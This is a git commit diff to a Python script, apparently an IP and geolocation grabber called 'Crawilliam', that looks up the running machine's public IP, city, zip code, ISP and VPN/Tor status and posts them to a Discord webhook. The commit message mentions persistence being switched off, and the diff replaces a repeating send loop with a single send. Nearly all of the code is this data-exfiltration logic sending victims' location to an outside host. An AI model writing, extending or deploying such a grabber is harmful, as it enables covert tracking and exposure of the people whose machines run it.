fc3cf9f647c8c42e448774d5a84c1f357b255f10
XeroShi Wasure <NinjaCraftGod@gmail.com>
2021-04-25 23:40:32 -0400

    Minor Changes Turned off Persistence until next git. Added a new API link for District, Proxy, and Mobile detection.

--- root.py
+++ root.py
@@ -4,16 +4,14 @@ import json
 from time import sleep
 
 #IP Address and Geolocation API
-Addy = requests.get('http://ip-api.com/json/').text
-Pinfo = json.loads(Addy)
-
+Addy = requests.get('http://ip-api.com/json/')
+FormAddy = json.loads(Addy.content)
+GeoLoc = requests.get(f'http://ip-api.com/json/{FormAddy["query"]}?fields=1830911').text
+Pinfo = json.loads(GeoLoc)
 
 #Function used to upload IP and Geolocation from API using Discord Webhook
 def WebhookLoop():
-    webhook = DiscordWebhook(
-    url='INSERTYOURWEBHOOK',
-    username='Crawilliam'
-     )
+    webhook = DiscordWebhook(url='WEBHOOKHERE', username='Crawilliam')
 
     embed = DiscordEmbed(
     title="Crawilliam's Fetch",
@@ -26,16 +24,22 @@ def WebhookLoop():
     embed.add_embed_field(name='IP Address:', value=Pinfo['query'], inline=False)
     embed.add_embed_field(name='Country:', value=Pinfo['country'])
     embed.add_embed_field(name='Reigon:', value=Pinfo['regionName'])
+    #embed.add_embed_field(name='District:', value=Pinfo['district']) <= Returns as Null. Uncomment if you find someone to r
     embed.add_embed_field(name='City', value=Pinfo['city'])
     embed.add_embed_field(name='Zip Code:', value=Pinfo['zip'])
-    embed.add_embed_field(name='ISP:', value=Pinfo['isp'], inline=False)
+    embed.add_embed_field(name='ISP:', value=Pinfo['isp'])
+    embed.add_embed_field(name='Mobile Connection:', value=Pinfo['mobile'])
+    embed.add_embed_field(name='Proxy, VPN, Tor Exit:', value=Pinfo['proxy'])
     embed.set_timestamp()
     embed.set_footer(text='Made with Sleepless Delusions.')
     webhook.add_embed(embed)
     response = webhook.execute()
-    sleep(15) #temp time, just using this to see how well it works.
-    response = webhook.edit(response) #edits last message sent
+    #sleep(15) #temp time, just using this to see how well it works.
+    #response = webhook.edit(response) #edits last message sent
 
 #Loop to put this mess together
-while True:
-    WebhookLoop()
+#while True:
+    #sleep(30)
+    #WebhookLoop()
+
+WebhookLoop()
